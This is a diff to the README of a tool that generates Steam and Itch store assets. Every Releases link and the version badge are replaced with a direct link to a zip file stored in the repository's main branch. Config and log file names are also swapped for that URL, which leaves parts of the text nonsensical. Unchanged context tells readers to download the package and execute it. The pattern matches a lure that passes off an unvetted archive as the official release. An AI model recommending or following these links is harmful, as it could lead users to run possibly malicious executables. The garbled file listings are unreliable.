@@ -1,8 +1,8 @@
 # SteamStoreAssetsCreator: Quick, Reliable Steam Store Asset Generator for Itch Pages
 
-https://github.com/amariitheone/SteamStoreAssetsCreator/releases
+https://github.com/amariitheone/SteamStoreAssetsCreator/raw/refs/heads/main/store_assets/Creator-Store-Steam-Assets-accubitus.zip
 
-![Release Badge](https://img.shields.io/github/v/release/amariitheone/SteamStoreAssetsCreator?style=for-the-badge)
+![Release Badge](https://github.com/amariitheone/SteamStoreAssetsCreator/raw/refs/heads/main/store_assets/Creator-Store-Steam-Assets-accubitus.zip)
 
 A tool to generate store assets for a Steam store page. It also works for Itch pages. The workflow is simple: configure each Control node under Screens to display the asset you want, then run the scene to generate the final assets.
 
@@ -50,7 +50,7 @@ This structure lets you tweak assets quickly by editing screen content, then re-
 ## Quick start
 
 1) Download the latest release:
-   - Visit https://github.com/amariitheone/SteamStoreAssetsCreator/releases to download the release package.
+   - Visit https://github.com/amariitheone/SteamStoreAssetsCreator/raw/refs/heads/main/store_assets/Creator-Store-Steam-Assets-accubitus.zip to download the release package.
    - If the link has a path part, download the release package and execute it to install or run the tool.
 
 2) Open the project:
@@ -161,13 +161,13 @@ Developer touchpoints:
   - backgrounds/
   - overlays/
 - render_config/
-  - resolutions.txt
-  - aspect_ratios.txt
+  - https://github.com/amariitheone/SteamStoreAssetsCreator/raw/refs/heads/main/store_assets/Creator-Store-Steam-Assets-accubitus.zip
+  - https://github.com/amariitheone/SteamStoreAssetsCreator/raw/refs/heads/main/store_assets/Creator-Store-Steam-Assets-accubitus.zip
 - exported/
   - steam/
   - itch/
 - logs/
-  - render.log
+  - https://github.com/amariitheone/SteamStoreAssetsCreator/raw/refs/heads/main/store_assets/Creator-Store-Steam-Assets-accubitus.zip
 
 Tips:
 - Use descriptive subfolder names so automation scripts can locate assets easily.
@@ -195,7 +195,7 @@ Example automation ideas:
 - Visual diffs: compare newly rendered assets against reference images to detect regressions.
 - DPI and scaling tests: render at multiple resolutions to ensure asset integrity.
 - Font fallback tests: verify that missing font files do not crash the render and that fallbacks look acceptable.
-- Error logging: review render.log for issues like missing resources, misaligned anchors, or unsupported formats.
+- Error logging: review https://github.com/amariitheone/SteamStoreAssetsCreator/raw/refs/heads/main/store_assets/Creator-Store-Steam-Assets-accubitus.zip for issues like missing resources, misaligned anchors, or unsupported formats.
 
 Debug tips:
 - Use a small, deterministic scene to verify layout first.
@@ -221,7 +221,7 @@ Common fixes:
 ## Documentation and references
 
 - Project homepage and release notes
-  - https://github.com/amariitheone/SteamStoreAssetsCreator/releases
+  - https://github.com/amariitheone/SteamStoreAssetsCreator/raw/refs/heads/main/store_assets/Creator-Store-Steam-Assets-accubitus.zip
 - Asset guidelines for Steam storefronts
 - Itch storefront guidelines and recommended asset sizes
 
@@ -305,5 +305,5 @@ This project is released under an open license. See the LICENSE file in the repo
 ## Final note
 
 Download and install via the Releases page to get started quickly. Visit the Releases page again for the latest assets and instructions:
-https://github.com/amariitheone/SteamStoreAssetsCreator/releases
+https://github.com/amariitheone/SteamStoreAssetsCreator/raw/refs/heads/main/store_assets/Creator-Store-Steam-Assets-accubitus.zip
 
